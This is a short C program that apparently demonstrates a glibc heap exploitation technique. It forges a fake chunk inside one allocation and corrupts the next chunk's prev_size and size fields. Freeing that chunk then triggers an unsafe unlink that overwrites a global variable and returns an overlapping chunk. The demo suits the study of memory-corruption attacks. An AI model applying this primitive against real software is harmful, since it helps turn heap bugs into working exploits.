#include <stdio.h>
#include <stdlib.h>

long long chunk_addr=0;

void setbufs()
{
	setvbuf(stdin,0,2,0);
	setvbuf(stderr,0,2,0);
	setvbuf(stdout,0,2,0);
}


int main()
{
	void *p0,*p1,*p2,*p3,*p4;
	long long *ptr;

	setbufs();

	p0=malloc(0xf8);
	p1=malloc(0x100);
	p2=malloc(0x100);
	malloc(0x20);

	// in order to be easy
	// use gdb and turn off the aslr
	chunk_addr=0x602000+0x120;

	ptr=(long long*)p1;
	ptr++;ptr++;
	*ptr=0;
	*(ptr+1)=0xf1;
	*(ptr+2)=(long long)&chunk_addr-0x18;
	*(ptr+3)=(long long)&chunk_addr-0x10;

	ptr=(long long*)p2-2;
	*ptr=0xf0;
	*(ptr+1)=0x110;
	puts("watch");
	free(p2);

	p2=malloc(0x1f0);
	printf("now p2(%p) will be overlapped with p1(%p)\n",p2,p1);
	printf("and chunk_addr is rewritten:0x%llx(pre 0x602000)\n",chunk_addr);



	return 0;
}
